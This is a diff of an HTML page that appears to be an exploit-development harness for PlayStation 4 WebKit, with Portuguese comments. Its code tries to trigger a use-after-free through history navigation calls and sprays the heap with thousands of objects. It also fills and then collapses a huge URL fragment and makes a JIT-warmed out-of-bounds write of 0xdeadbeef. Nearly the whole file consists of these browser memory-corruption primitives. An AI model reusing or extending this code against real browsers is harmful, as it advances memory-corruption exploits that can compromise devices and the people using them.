@@ -2,95 +2,130 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>UAF Slot Class Scanner</title>
+<title>PS4 WebKit – Unified Diagnostic Harness</title>
 <style>
 body { font-family: monospace; background:#000; color:#0f0; }
-button { margin:4px; padding:6px; }
-#log { white-space:pre-wrap; margin-top:10px; }
+button { margin:5px; padding:10px; font-family: monospace; }
+pre { white-space: pre-wrap; }
 </style>
 </head>
 <body>
 
-<h2>UAF Slot Fixation – Class Scanner</h2>
+<h2>Unified UAF / Fragment / JIT Diagnostic Harness</h2>
 
-<button onclick="testClass('jsobject')">JSObject</button>
-<button onclick="testClass('array')">Array</button>
-<button onclick="testClass('string')">String Object</button>
-<button onclick="testClass('arraybuffer')">ArrayBuffer</button>
-<button onclick="testClass('dataview')">DataView</button>
-<button onclick="testClass('uint8')">Uint8Array</button>
-<button onclick="testClass('uint32')">Uint32Array</button>
-<button onclick="testClass('float64')">Float64Array</button>
-<button onclick="testClass('map')">Map</button>
-<button onclick="testClass('set')">Set</button>
-<button onclick="testClass('promise')">Promise</button>
+<button onclick="runClassSlotTests()">[A] Testar Classes (Slot Reuse)</button>
+<button onclick="runFragmentStringTests()">[B] Testar Fragment / String</button>
+<button onclick="runJITIsolationTests()">[C] Testar JIT + Interseção</button>
 
-<div id="log"></div>
+<pre id="log"></pre>
 
 <script>
-const logEl = document.getElementById("log");
-const log = m => logEl.textContent += m + "\n";
-const sleep = ms => new Promise(r=>setTimeout(r,ms));
+const log = msg => {
+    document.getElementById("log").textContent += msg + "\n";
+};
 
-async function triggerUAF(){
-    log("\n=== UAF TRIGGER START ===");
-    let size = 977;
-    const STEP = 14461;
-
-    for(let i=0;i<48;i++){
-        let frag = "A".repeat(size);
-        history.pushState({}, "", "#"+frag);
-        history.replaceState({}, "", "#"+frag.slice(0, frag.length >> 1));
-        if(i % 6 === 0){
-            setTimeout(()=>history.back(),0);
-            log(`[ITER ${i}] back() async`);
-        }
-        size += STEP;
-        await sleep(4);
+/* -----------------------------
+   UAF TRIGGER (PADRÃO CONFIRMADO)
+------------------------------ */
+async function triggerUAF() {
+    log("=== UAF TRIGGER START ===");
+    for (let i = 0; i < 48; i += 6) {
+        history.back();
+        await new Promise(r => setTimeout(r, 0));
+        log("[ITER " + i + "] back() async");
     }
     log(">>> UAF WINDOW <<<");
 }
 
-function baseline(){
-    log("\n=== BASELINE ===");
-    log("URL.length = " + document.URL.length);
-    log("charCodeAt(64) = " + document.URL.charCodeAt(64));
-}
+/* -----------------------------
+   DIREÇÃO A – CLASSES PEQUENAS
+------------------------------ */
+async function runClassSlotTests() {
+    log("\n=== DIRECTION A: CLASS SLOT TESTS ===");
+    await triggerUAF();
 
-function spray(type){
-    log("\n=== SLOT FIXATION (" + type + ") ===");
-    let arr = [];
-    for(let i=0;i<8000;i++){
-        switch(type){
-            case "jsobject": arr.push({a:1,b:2}); break;
-            case "array": arr.push([1,2,3,4]); break;
-            case "string": arr.push(new String("AAAA")); break;
-            case "arraybuffer": arr.push(new ArrayBuffer(0x20)); break;
-            case "dataview": arr.push(new DataView(new ArrayBuffer(0x20))); break;
-            case "uint8": arr.push(new Uint8Array(0x20)); break;
-            case "uint32": arr.push(new Uint32Array(8)); break;
-            case "float64": arr.push(new Float64Array(4)); break;
-            case "map": arr.push(new Map([[1,2]])); break;
-            case "set": arr.push(new Set([1,2])); break;
-            case "promise": arr.push(Promise.resolve(1)); break;
+    const tests = {
+        JSObject: () => ({a:1}),
+        Array: () => [],
+        Function: () => function(){},
+        RegExp: () => /a/,
+        Arguments: () => (function(){ return arguments; })(1,2,3)
+    };
+
+    for (let name in tests) {
+        let objs = [];
+        for (let i = 0; i < 6000; i++) objs.push(tests[name]());
+        log("[CLASS] " + name + " sprayed: " + objs.length);
+
+        try {
+            let s = location.href;
+            log("[CLASS " + name + "] charCodeAt(64) = " + s.charCodeAt(64));
+        } catch(e) {
+            log("[CLASS " + name + "] exception");
         }
     }
-    log("Spray done: " + arr.length);
-    return arr;
+
+    log("=== END DIRECTION A ===\n");
 }
 
-async function testClass(type){
-    logEl.textContent = "";
-    baseline();
-    await triggerUAF();
-    await sleep(120);
-    spray(type);
+/* -----------------------------
+   DIREÇÃO B – FRAGMENT / STRING
+------------------------------ */
+async function runFragmentStringTests() {
+    log("\n=== DIRECTION B: FRAGMENT / STRING TESTS ===");
 
-    log("\n=== POST ===");
-    log("URL.length = " + document.URL.length);
-    log("charCodeAt(64) = " + document.URL.charCodeAt(64));
-    log("\n=== END TEST ===");
+    let big = "A".repeat(340000);
+    location.hash = big;
+
+    log("[BASE] URL.length = " + location.href.length);
+    log("[BASE] charCodeAt(64) = " + location.href.charCodeAt(64));
+
+    await triggerUAF();
+
+    location.hash = "#X";
+
+    log(">>> FRAGMENT COLLAPSE <<<");
+    log("[POST] URL.length = " + location.href.length);
+
+    [32,64,128,256].forEach(i=>{
+        log("[POST] charCodeAt(" + i + ") = " + location.href.charCodeAt(i));
+    });
+
+    log("=== END DIRECTION B ===\n");
+}
+
+/* -----------------------------
+   DIREÇÃO C – JIT ISOLADO
+------------------------------ */
+async function runJITIsolationTests() {
+    log("\n=== DIRECTION C: JIT ISOLATION TEST ===");
+
+    function jitFunc(arr, idx, val) {
+        arr[idx] = val;
+        return arr[idx];
+    }
+
+    let arr = new Uint32Array(16);
+
+    // Aquecimento JIT
+    for (let i = 0; i < 20000; i++) jitFunc(arr, 0, i);
+
+    await triggerUAF();
+
+    let r;
+    try {
+        r = jitFunc(arr, 16, 0xdeadbeef);
+        log("[JIT] write/read idx 16 = 0x" + r.toString(16));
+    } catch(e) {
+        log("[JIT] exception");
+    }
+
+    log("[POST] URL.length = " + location.href.length);
+    log("[POST] charCodeAt(64) = " + location.href.charCodeAt(64));
+
+    log("=== END DIRECTION C ===\n");
 }
 </script>
+
 </body>
 </html>
